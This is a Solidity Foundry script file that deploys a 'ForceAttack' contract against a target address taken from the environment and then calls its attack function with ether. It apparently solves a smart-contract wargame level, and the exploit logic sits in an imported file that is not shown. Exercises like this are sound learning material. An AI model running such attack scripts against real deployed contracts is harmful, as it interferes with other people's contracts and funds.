// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "../src/ForceExploit.sol";

contract DeployForceAttack is Script {
    function run() external {
        address targetAddress = vm.envAddress("FORCE_TARGET");
        
        vm.startBroadcast();
        
        ForceAttack attack = new ForceAttack(targetAddress);
        
        vm.stopBroadcast();
        
        console.log("ForceAttack deployed at:", address(attack));
        console.log("Target:", targetAddress);
    }
}

contract ExecuteForceAttack is Script {
    function run() external {
        address attackAddress = vm.envAddress("FORCE_ATTACK");
        uint256 amount = vm.envUint("ATTACK_AMOUNT");
        
        vm.startBroadcast();
        
        ForceAttack(attackAddress).attack{value: amount}();
        
        vm.stopBroadcast();
        
        console.log("Attack executed with amount:", amount);
    }
}
